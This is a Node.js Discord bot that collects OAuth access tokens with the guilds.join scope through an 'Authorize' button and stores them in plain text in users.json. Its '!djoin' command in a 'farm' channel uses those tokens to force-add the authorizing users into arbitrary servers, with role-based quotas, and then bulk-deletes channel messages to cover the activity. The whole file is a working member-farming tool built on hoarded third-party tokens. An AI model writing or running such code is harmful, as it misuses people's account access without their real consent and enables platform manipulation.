require('dotenv').config();
const express = require('express');
const axios = require('axios');
const fs = require('fs');
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

const app = express();
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });

const BASE_URL = 'https://my-discord-bot-4h98.onrender.com';
const AUTH_CHANNEL_ID = '1521111193903698053';
const FARM_CHANNEL_ID = '1520843854079852725';

const getUsers = () => {
    try {
        if (!fs.existsSync('users.json')) return [];
        return JSON.parse(fs.readFileSync('users.json', 'utf8'));
    } catch (e) { return []; }
};

app.get('/login', (req, res) => {
    res.redirect(`https://discord.com/api/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(BASE_URL + '/callback')}&response_type=code&scope=identify%20guilds.join`);
});

app.get('/callback', async (req, res) => {
    try {
        const { code } = req.query;
        const tokenRes = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: process.env.CLIENT_ID, client_secret: process.env.CLIENT_SECRET,
            grant_type: 'authorization_code', code: code, redirect_uri: BASE_URL + '/callback'
        }).toString());
        
        const userRes = await axios.get('https://discord.com/api/users/@me', { headers: { Authorization: `Bearer ${tokenRes.data.access_token}` } });
        let users = getUsers();
        
        if (!users.find(u => u.id === userRes.data.id)) {
            users.push({ id: userRes.data.id, accessToken: tokenRes.data.access_token });
            fs.writeFileSync('users.json', JSON.stringify(users, null, 2));
        }
        res.send("<h1>Authorized!</h1>");
    } catch (err) { res.status(500).send("Error."); }
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (message.content === '!authorize') {
        if (message.channel.id !== AUTH_CHANNEL_ID) return;
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Authorize').setURL(`${BASE_URL}/login`).setStyle(ButtonStyle.Link));
        await message.channel.send({ content: 'Click to authorize:', components: [row] });
    }

    if (message.content === '!auth') {
        message.reply(`Total authorized: ${getUsers().length}`);
    }

    if (message.content.startsWith('!djoin')) {
        if (message.channel.id !== FARM_CHANNEL_ID) return;
        const authorizedUsers = getUsers();
        if (!authorizedUsers.find(u => u.id === message.author.id)) return;

        const roles = { '1520852026823803002': 5, '1520852270898483272': 7, '1520852326800294058': 10, '1520852424108281897': 15, '1520852492768903218': 35 };
        let limit = 2; 
        for (const [r, l] of Object.entries(roles)) if (message.member.roles.cache.has(r)) limit = l;

        const sid = message.content.split(' ')[1]?.replace(/[<|>]/g, '');
        if (!sid) return;
        
        let count = 0;
        for (const user of authorizedUsers.slice(0, limit)) {
            try {
                await axios.put(`https://discord.com/api/v10/guilds/${sid}/members/${user.id}`, { access_token: user.accessToken }, { headers: { 'Authorization': `Bot ${process.env.BOT_TOKEN}` } });
                count++;
            } catch (e) {}
        }
        const fetched = await message.channel.messages.fetch({ limit: 20 });
        await message.channel.bulkDelete(fetched, true).catch(() => {});
        const m = await message.channel.send(`✅ Added ${count} users.`);
        setTimeout(() => m.delete().catch(() => {}), 6000);
    }
});

client.login(process.env.BOT_TOKEN);
app.listen(process.env.PORT || 3000);
